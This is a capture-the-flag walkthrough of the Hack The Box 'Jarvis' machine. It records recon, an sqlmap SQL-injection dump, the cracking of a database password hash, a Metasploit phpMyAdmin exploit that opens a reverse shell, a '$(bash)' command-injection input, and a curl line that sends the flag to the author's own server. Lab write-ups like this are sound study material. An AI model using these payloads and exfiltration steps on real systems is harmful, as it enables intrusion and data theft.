---
layout: post
title: Hack The Box Writeup - Jarvis
---

Opening with Nmap to find open ports

```
sudo nmap -sS -sV -T4 -oA jarvis_nmap -p- 10.10.10.143                                         ✘ 1 
[sudo] password for dan: 
Starting Nmap 7.70 ( https://nmap.org ) at 2019-07-28 13:38 BST
Nmap scan report for 10.10.10.143
Host is up (0.030s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.34 seconds
```

Visiting port 80 in a browser loads a webpage for a Tony Stark themed hotel

Visiting port 64999 in a browser get you: "Hey you have been banned for 90 seconds, don't be bad"

Requesting port 64999 using HTTPie results in:

```
http 10.10.10.143:64999
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Length: 54
Content-Type: text/html
Date: Sun, 28 Jul 2019 13:04:58 GMT
ETag: "36-5833b43634c39"
IronWAF: 2.0.3
Keep-Alive: timeout=5, max=100
Last-Modified: Mon, 04 Mar 2019 02:10:40 GMT
Server: Apache/2.4.25 (Debian)

Hey you have been banned for 90 seconds, don't be bad
```

I can't find any mention of IronWAF on Google, so I guess this is something custom for this box.

Using gobuster for directory enumeration:

```
gobuster -u http://10.10.10.143 -w ~/SecLists/Discovery/Web-Content/common.txt                 ✘ 1 

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.143/
[+] Threads      : 10
[+] Wordlist     : /home/dan/SecLists/Discovery/Web-Content/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/07/28 14:10:03 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
=====================================================
2019/07/28 14:10:17 Finished
=====================================================
```

Visiting 10.10.10.143/phpmyadmin loads a standard phpMyAdmin login form. From a chunk of CDATA in the source for the login page, I can tell that this is phpMyAdmin 4.8.0, although wig disagrees.

```
wig 10.10.10.143                                                                               ✘ 1 

wig - WebApp Information Gatherer


Scanning http://10.10.10.143...
______________________________ SITE INFO ______________________________
IP                           Title                                     
10.10.10.143                 Stark Hotel                             
                                                                       
_______________________________ VERSION _______________________________
Name                         Versions               Type               
phpMyAdmin                   4_6_4                  CMS                
Apache                       2.4.25                 Platform           
PHP                                                 Platform           
                                                                       
_____________________________ INTERESTING _____________________________
URL                          Note                   Type               
/phpmyadmin/setup/index.php  PHPMyAdmin setup page  Interesting        
                                                                       
_______________________________________________________________________
Time: 8.2 sec                Urls: 506              Fingerprints: 40401
```

wig has found that the phpMyAdmin setup script has been left on the server 

https://www.cvedetails.com/cve/CVE-2018-12613/

Because we have the setup file available, we can turn on "Allow login to any MySQL server" (Features -> Security) and then connect to our own MySQL/MariaDB instance, which allows us to execute code! And there's a metasploit module for this.

```
sudo docker run -it --rm -p 3306:3306 -e MYSQL_ROOT_PASSWORD=toor mariadb:latest --bind-address=0.0.0.0
```

After much fiddling, it felt like I was down a rabbit hold, so I started poking around the web content some more. Looking at a room page, http://10.10.10.143/room.php?cod=1 the url contains a parameter. Changing this to a single quote results in a page with no room content loaded, so I thought I'd try using SQLmap to probe for SQLi.

```
sqlmap -u http://10.10.10.143/room.php\?cod\=1 -p cod
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.3.7#stable}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:40:23 /2019-07-28/

[15:40:23] [INFO] testing connection to the target URL
[15:40:23] [INFO] testing if the target URL content is stable
[15:40:24] [INFO] target URL content is stable
[15:40:24] [WARNING] heuristic (basic) test shows that GET parameter 'cod' might not be injectable
[15:40:24] [INFO] testing for SQL injection on GET parameter 'cod'
[15:40:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:40:24] [INFO] GET parameter 'cod' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="of")
[15:40:25] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] n
[15:40:30] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[15:40:30] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[15:40:30] [INFO] testing 'MySQL inline queries'
[15:40:30] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[15:40:30] [WARNING] time-based comparison requires larger statistical model, please wait........ (done)          
[15:40:41] [INFO] GET parameter 'cod' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[15:40:41] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[15:40:41] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[15:40:41] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[15:40:41] [INFO] target URL appears to have 7 columns in query
[15:40:42] [INFO] GET parameter 'cod' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'cod' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection point(s) with a total of 53 HTTP(s) requests:
---
Parameter: cod (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: cod=1 AND 1479=1479

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: cod=1 AND (SELECT 4178 FROM (SELECT(SLEEP(5)))zsfE)

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: cod=-6211 UNION ALL SELECT NULL,NULL,CONCAT(0x7162716271,0x7177564e59745556435174517942716b47536b54756d7a774f4d7152434d4c697266416a4f645849,0x716a787671),NULL,NULL,NULL,NULL-- hHoo
---
[15:40:44] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9.0 (stretch)
web application technology: PHP, Apache 2.4.25
back-end DBMS: MySQL >= 5.0.12
[15:40:44] [INFO] fetched data logged to text files under '/home/dan/.sqlmap/output/10.10.10.143'

[*] ending @ 15:40:44 /2019-07-28/
sqlmap -u http://10.10.10.143/room.php\?cod\=1 -p cod -a 
%<----SNIP-----
```
That second command that dumps the whole database will take a while!

Buried in the massive amount of output is the Username and Password hash of a database user: DBadmin and "2D2B7A5E4E637B8FBA1D17F40318F277D29964D0". As you can guess from the name, SQLmap also confirmed that this user has full DBA permissions.

Hashcat for the password hash:

```
echo '2D2B7A5E4E637B8FBA1D17F40318F277D29964D0' > hash
hashcat -a 0 -w 2 -m 300 hash ~/SecLists/Passwords/Leaked-Databases/rockyou.txt

hashcat (v5.1.0) starting...

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce GTX 1050 Ti, 1009/4036 MB allocatable, 6MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Temperature abort trigger set to 90c

Dictionary cache hit:
* Filename..: /home/dan/SecLists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

2d2b7a5e4e637b8fba1d17f40318f277d29964d0:imissyou
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: MySQL4.1/MySQL5
Hash.Target......: 2d2b7a5e4e637b8fba1d17f40318f277d29964d0
Time.Started.....: Sun Jul 28 15:56:11 2019 (1 sec)
Time.Estimated...: Sun Jul 28 15:56:12 2019 (0 secs)
Guess.Base.......: File (/home/dan/SecLists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 37200.3 kH/s (2.13ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 393216/14344384 (2.74%)
Rejected.........: 0/393216 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -> remmer
Hardware.Mon.#1..: Temp: 37c Fan: 30% Util:  0% Core:1430MHz Mem:3504MHz Bus:16

Started: Sun Jul 28 15:56:07 2019
Stopped: Sun Jul 28 15:56:12 2019
```

Logging into phpMyAdmin with DBadmin:imissyou logs us in!

Revisiting that earlier CVE:

```
msf5 > use exploit/multi/http/phpmyadmin_lfi_rce 
msf5 exploit(multi/http/phpmyadmin_lfi_rce) > set target 2
target => 2
msf5 exploit(multi/http/phpmyadmin_lfi_rce) > set RHOSTS 10.10.10.143
RHOSTS => 10.10.10.143
msf5 exploit(multi/http/phpmyadmin_lfi_rce) > show options

Module options (exploit/multi/http/phpmyadmin_lfi_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    no        Password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.10.10.143     yes       The target address range or CIDR identifier
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /phpmyadmin/     yes       Base phpMyAdmin directory path
   USERNAME   root             yes       Username to authenticate with
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   2   Linux


msf5 exploit(multi/http/phpmyadmin_lfi_rce) > set USERNAME DBadmin
USERNAME => DBadmin
msf5 exploit(multi/http/phpmyadmin_lfi_rce) > set PASSWORD imissyou
PASSWORD => imissyou
msf5 exploit(multi/http/phpmyadmin_lfi_rce) > run

[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] Sending stage (38247 bytes) to 10.10.10.143
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.143:41174) at 2019-07-28 15:59:11 +0100
```

The meterpreter session hung, so I hit CTRL+C and got back to the standard prompt. But the session wasn't closed, so I could resume interaction by running `sessions -i 1`.

```
meterpreter > sysinfo
Computer    : jarvis
OS          : Linux jarvis 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64
Meterpreter : php/linux
meterpreter > getuid
Server username: www-data (33)
```

So we've got a shell as www-data.

```
meterpreter > shell
Process 1323 created.
Channel 0 created.
ls -alh /home
total 12K
drwxr-xr-x  3 root   root   4.0K Mar  2 08:54 .
drwxr-xr-x 23 root   root   4.0K Mar  3 22:52 ..
drwxr-xr-x  4 pepper pepper 4.0K Mar  5 07:12 pepper
ls -alh /home/pepper
total 32K
drwxr-xr-x 4 pepper pepper 4.0K Mar  5 07:12 .
drwxr-xr-x 3 root   root   4.0K Mar  2 08:54 ..
lrwxrwxrwx 1 root   root      9 Mar  4 11:11 .bash_history -> /dev/null
-rw-r--r-- 1 pepper pepper  220 Mar  2 08:54 .bash_logout
-rw-r--r-- 1 pepper pepper 3.5K Mar  2 08:54 .bashrc
drwxr-xr-x 2 pepper pepper 4.0K Mar  2 10:15 .nano
-rw-r--r-- 1 pepper pepper  675 Mar  2 08:54 .profile
drwxr-xr-x 3 pepper pepper 4.0K Mar  4 11:14 Web
-r--r----- 1 root   pepper   33 Mar  5 07:11 user.txt
```

```
meterpreter > shell
Process 17850 created.
Channel 8 created.
sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py

meterpreter > ls                                                                                                                                                             
Listing: /var/www/Admin-Utilities                                                     
=================================                                                                                                                                            
                                                                                      
Mode              Size  Type  Last modified              Name   
----              ----  ----  -------------              ----    
100744/rwxr--r--  4587  fil   2019-03-04 12:48:11 +0000  simpler.py
meterpreter > download simpler.py
[*] Downloading: simpler.py -> simpler.py
[*] Downloaded 4.48 KiB of 4.48 KiB (100.0%): simpler.py -> simpler.py
[*] download   : simpler.py -> simpler.py
```

Reviewing the script, we can see that the -p option to ping an IP address uses os.system and passes user supplied input to the command to be executed. This is gennerally VERY dangerous. The script author blacklisted a bunch of normal special characters used for command injection, so trying something like `127.0.0.1 && cat /etc/password` won't work. However, subshell commands did work!

```
sudo -u pepper -- /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(bash)
$(bash)
pepper@jarvis:/var/www/Admin-Utilities$ cat /home/pepper/user.txt
cat /home/pepper/user.txt
```
Annoyingly, whenever I tried to run a command, I'd normally just get the command echo'd back to me. To get around this, I spun up a local HTTP server using python (`python3 -m http.server`) and used cURL to exfiltrate the user flag

```
curl 10.10.14.2:8000/`cat /home/pepper/user.txt`

#Local server logs
10.10.10.143 - - [29/Jul/2019 17:34:08] code 404, message File not found
10.10.10.143 - - [29/Jul/2019 17:34:08] "GET /2afa36c4f05b37b34259c93551f5c44f HTTP/1.1" 404 -
```

So now, how do we get an easier to use command shell?


